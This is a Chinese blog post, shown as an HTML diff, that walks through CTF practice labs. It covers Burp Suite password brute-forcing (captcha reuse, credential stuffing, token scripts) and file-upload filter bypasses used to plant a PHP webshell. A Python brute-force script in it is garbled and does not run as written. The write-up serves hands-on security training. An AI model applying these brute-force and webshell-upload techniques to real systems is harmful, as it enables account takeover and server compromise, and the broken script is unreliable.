@@ -1,0 +1,561 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>密码爆破 | Chalnl's Blog</title><meta name="keywords" content="111"><meta name="author" content="Chalnl"><meta name="copyright" content="Chalnl"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BP密码爆破使用方法，是认证技术的基础操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="密码爆破">
+<meta property="og:url" content="http://chalnl.com/posts/22329/sec3/index.html">
+<meta property="og:site_name" content="Chalnl&#39;s Blog">
+<meta property="og:description" content="BP密码爆破使用方法，是认证技术的基础操作">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008s52kYly1h553icnjodj30n20uwgnb.jpg">
+<meta property="article:published_time" content="2022-08-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-16T08:27:00.562Z">
+<meta property="article:author" content="Chalnl">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="密码爆破">
+<meta property="article:tag" content="题目详解">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008s52kYly1h553icnjodj30n20uwgnb.jpg"><link rel="shortcut icon" href="http://tva1.sinaimg.cn/large/008s52kYly1h4zpbrmrzij308b08bdg7.jpg"><link rel="canonical" href="http://chalnl.com/posts/22329/sec3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="manifest" href="/pwa/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/pwa/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/pwa/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/pwa/16.png"/><link rel="mask-icon" href="/pwa/safari-pinned-tab.svg" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Chalnl","link":"链接: ","source":"来源: Chalnl's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '密码爆破',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-16 16:27:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/_custom/custom.css"  media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Chalnl's Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tva1.sinaimg.cn/large/008s52kYly1h54wu8p88cj30u00u076w.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movies</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/box/"><i class="fa-fw fab fa-xbox"></i><span> 聚宝盒</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw far fa-comment"></i><span> 微语</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-image"></i><span> gallery</span></a></li><li><a class="site-page child" href="/home/"><i class="fa-fw fab fa-phoenix-framework"></i><span> home</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008s52kYly1h553icnjodj30n20uwgnb.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Chalnl's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movies</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/box/"><i class="fa-fw fab fa-xbox"></i><span> 聚宝盒</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw far fa-comment"></i><span> 微语</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-image"></i><span> gallery</span></a></li><li><a class="site-page child" href="/home/"><i class="fa-fw fab fa-phoenix-framework"></i><span> home</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">密码爆破</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-11T16:00:00.000Z" title="发表于 2022-08-12 00:00:00">2022-08-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-16T08:27:00.562Z" title="更新于 2022-08-16 16:27:00">2022-08-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="密码爆破"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>这也是认证技术的一部分<br>  因为内容原因特地分出来</p>
+</blockquote>
+<h1 id="BurpSuite-lntruder爆破模块详解"><a href="#BurpSuite-lntruder爆破模块详解" class="headerlink" title="BurpSuite lntruder爆破模块详解"></a>BurpSuite lntruder爆破模块详解</h1><p><strong>本项目的优势</strong>：</p>
+<ol>
+<li><strong>Docker 一键部署</strong>很方便，可以灵活的导入到 CTFd 中</li>
+<li><strong>前面是解题提示和思路，后面带有详细的解题步骤</strong> </li>
+<li>题目更侧重于教学，注重对选手解题的引导，而不是一味地刁难选手</li>
+<li>详细的解题步骤转自<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlsec.com/2020/10/upload.html">国光的博客</a></li>
+</ol>
+<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p><strong>DockerHub 项目地址</strong>：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://hub.docker.com/r/sqlsec/ggctf-upload">https://hub.docker.com/r/sqlsec/ggctf-upload</a><br><strong>Github 项目地址</strong>：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a></p>
+<ul>
+<li><strong>推荐使用 Ubuntu 哦</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目文件夹</span></span><br><span class="line"><span class="built_in">cd</span> upload-labs-docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署运行</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>默认 13 个关卡运行的端口为 30001-30013 这 13 个端口上，如果要自定义端口信息的话，自行修改 docker-compose.yml 文件即可。</p>
+<blockquote>
+<p>一共 13 个 Docker 容器，可能第一次部署需要一定的时间，有点硬伤， 耐心等待一下即可</p>
+</blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16035979507409.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16035979507409.png" alt="img"></a></p>
+<h2 id="Web爆破靶场实战"><a href="#Web爆破靶场实战" class="headerlink" title="Web爆破靶场实战"></a>Web爆破靶场实战</h2><h3 id="1-简单的四位数字密码爆破"><a href="#1-简单的四位数字密码爆破" class="headerlink" title="1.简单的四位数字密码爆破"></a>1.简单的四位数字密码爆破</h3><p>用 BP 抓包发测试 <strong>Intruder</strong> 进行爆破，注意要<strong>设置密码格式</strong></p>
+<h3 id="2-简单的弱口令密码爆破"><a href="#2-简单的弱口令密码爆破" class="headerlink" title="2.简单的弱口令密码爆破"></a>2.简单的弱口令密码爆破</h3><ul>
+<li><strong>验证码复用</strong>漏洞<br>用 BP 抓包  输入字典进行爆破 </li>
+</ul>
+<h3 id="3-带验证码的密码爆破？"><a href="#3-带验证码的密码爆破？" class="headerlink" title="3.带验证码的密码爆破？"></a>3.带验证码的密码爆破？</h3><p>抓包之后 <strong>不放包</strong> 验证码不会失效 就能一直爆破了</p>
+<h3 id="4-Basic-爆破"><a href="#4-Basic-爆破" class="headerlink" title="4.Basic 爆破"></a>4.Basic 爆破</h3><p>将密码加密 base64 加密<br>BP <strong>迭代器</strong>，账号:密码  有效载荷选项 和 有效负荷处理</p>
+<h3 id="5-前端加密爆破"><a href="#5-前端加密爆破" class="headerlink" title="5.前端加密爆破"></a>5.前端加密爆破</h3><ul>
+<li>原理：把前端加密 md5 放进数据库<br>BP 有效负荷处理 添加HASH 的md5 加密 然后再攻击</li>
+</ul>
+<h3 id="6-泄露数据库撞库"><a href="#6-泄露数据库撞库" class="headerlink" title="6.泄露数据库撞库"></a>6.泄露数据库撞库</h3><ul>
+<li>BP使用<br><strong>音叉攻击 Pichfork</strong>：是用户名与密码一一对应的进行爆破</li>
+</ul>
+<h3 id="7-泄露数据库撞库-2"><a href="#7-泄露数据库撞库-2" class="headerlink" title="7.泄露数据库撞库-2"></a>7.泄露数据库撞库-2</h3><ul>
+<li>BP使用<br><strong>音叉攻击 Pichfork，paylode处理hash md5加密</strong></li>
+</ul>
+<h3 id="8-返回包提取爆破"><a href="#8-返回包提取爆破" class="headerlink" title="8.返回包提取爆破"></a>8.返回包提取爆破</h3><p>正确错误<strong>返回密码长度都相同</strong>时， 在Options中选择<strong>Extract</strong> ，添加返回<strong>选中</strong></p>
+<h3 id="9-简单的-token-验证"><a href="#9-简单的-token-验证" class="headerlink" title="9.简单的 token 验证"></a>9.简单的 token 验证</h3><ul>
+<li>token 时间戳形式<br>时间戳 BP 不能写时间戳 需要手动写脚本<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url =<span class="string">&quot;http://10.20.24.244/&quot;</span> headers =</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;10.20.24.244&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type1: &#x27;</span>application/x-ww-form-urlencoded<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>User-Agent<span class="string">&#x27;:&#x27;</span>Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>;Win64;x64)AppleWebKit/<span class="number">537.36</span> (KHTML,like</span><br><span class="line">&#125;</span><br><span class="line">payloads=<span class="built_in">open</span>(<span class="string">&quot;pass,txt&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    data =<span class="string">f&quot;username=admin&amp;password=<span class="subst">&#123;payload&amp;token=&#123;md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.tihe())))y<span class="string">&quot; </span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    r = requests.post(url=url, headers=headers, data=data)</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    if&#x27;flag&#123;&#x27;in r.text:</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">        print(f&quot;</span>\033[<span class="number">32</span>;1m[+] success &#123;data&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[1;34m[*] attack<span class="subst">&#123;data&#125;</span>\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="10-没有简单的弱口令"><a href="#10-没有简单的弱口令" class="headerlink" title="10.没有简单的弱口令"></a>10.没有简单的弱口令</h3><p>验证码只能用一次   验证码爆破 </p>
+<ul>
+<li>利用burp的插件来进行验证码识别爆破</li>
+<li>用captcha-killer插件，开源地址:<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/cOny1/captcha-killer">https://github.com/cOny1/captcha-killer</a></li>
+<li>工具 ：pkavhttpfuzzer  爱盘BP 1.7  captcha</li>
+</ul>
+<ol>
+<li>将测试包粘贴到工具中 添加字典 </li>
+<li>添加验证码标记 写入验证码地址</li>
+<li>验证码识别重放模式：单线程</li>
+</ol>
+<hr>
+<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16035981315620.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16035981315620.png" alt="img"></a></p>
+<p>如何判断是否是前端验证呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036095176123.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036095176123.png" alt="img"></a></p>
+<h2 id="解法一：抓包"><a href="#解法一：抓包" class="headerlink" title="解法一：抓包"></a>解法一：抓包</h2><p>因为是前段验证的问题，可以直接将 shell.php 重命名为 shell.png 上传抓包的时候再将文件名修改为 shell.php 即可绕过前段限制，成功上传 webshell。</p>
+<h2 id="解法二：禁用-JS"><a href="#解法二：禁用-JS" class="headerlink" title="解法二：禁用 JS"></a>解法二：禁用 JS</h2><p>因为 JS 来校验文件后缀的原因，所以可以直接在浏览器上禁用 JS 这样就可以直接上传文件了。Chrome 内核的浏览器在审查元素的状态下可以找到 Settings 选项，然后找到 「Debugger」 选项下面直接勾选 「Disable JavaScript」即可。</p>
+<h2 id="解法三：调试-JS"><a href="#解法三：调试-JS" class="headerlink" title="解法三：调试 JS"></a>解法三：调试 JS</h2><p>这种解法就类似于孔乙己中的茴香豆的 「茴」有几种写法？，纯粹就是为了炫技，但是并不实用，那么国光下面就简单说下调试 JS 的过程吧。</p>
+<p>首先审查元素下下断点：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036082412704.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036082412704.png" alt="img"></a></p>
+<p>单行单步调试，找到 <code>whitelist</code> 变量，双击元素然后直接修改数组元素的值 ：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036087605888.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036087605888.png" alt="img"></a></p>
+<p>放掉数据包，之前的 shell.php 可直接上传成功：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603608623108.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603608623108.png" alt="img"></a></p>
+<p>成功拿到根目录下的 flag：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036086662827.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036086662827.png" alt="img"></a></p>
+<h1 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h1><p>这样下去感觉上课都不需要 PPT 了，关键姿势点都直接贴在了题目中了：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036091167949.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036091167949.png" alt="img"></a></p>
+<p>因为提示了 MIME 类型校验，所以抓取上传的数据包然后直接修改 <code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型即可：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/1603684549564.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/1603684549564.png" alt="img"></a></p>
+<h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>本题配图中里面包含了 GIF89a 已经很明显了，答案就在题目中：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036097871368.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036097871368.png" alt="img"></a></p>
+<p>本题校验了图片的文件头也就是校验图片内容的，这个时候使用一个标准的图马是可以成功绕过的，由于国光的这个代码只校验了前面几个字节，所以直接写 GIF89a 即可成功绕过：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036846031002.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036846031002.png" alt="img"></a></p>
+<h1 id="缺陷的代码-1"><a href="#缺陷的代码-1" class="headerlink" title="缺陷的代码 - 1"></a>缺陷的代码 - 1</h1><p>本题的图片上的第 2 行代码是一个有缺陷的代码，黑名单关键词替换为空的操作是一种不安全的写法：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036102265581.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036102265581.png" alt="img"></a></p>
+<p>因为代码开发者的错误写法，这种情况下可以直接使用嵌套后缀绕过：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036846312806.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036846312806.png" alt="img"></a></p>
+<h1 id="缺陷的代码-2"><a href="#缺陷的代码-2" class="headerlink" title="缺陷的代码 - 2"></a>缺陷的代码 - 2</h1><p>本地属于理论上漏洞，因为题目环境是 Docker 容器运行的 Linux 系统，所以本题国光修改成了 Windows 的特性</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/1603610505374.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/1603610505374.png" alt="img"></a></p>
+<p>同理图片提示中的第 2 行代码也是有缺陷的，可以仅用了 <code>str_replace</code> 替换，这样很容易就被大小写绕过，因为 Windows 环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用，所以本题是国光自己造的漏洞，用来伪造 Windows 环境下的大小写不区分的情况：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/1603684654836.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/1603684654836.png" alt="img"></a></p>
+<h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p>本题同样题目的配图中暗示已经比较明显了，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201025/16036116763150.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201025/16036116763150.png" alt="img"></a></p>
+<p>那么这里 Fuzz 一下，发现这些稍微冷门的后缀都可以直接绕过：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036846759511.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036846759511.png" alt="img"></a></p>
+<h1 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h1><p>本题的暗示也已经很明显了，只要选手查询 htaccess 怎么解析的话，就可以很顺利的解题：</p>
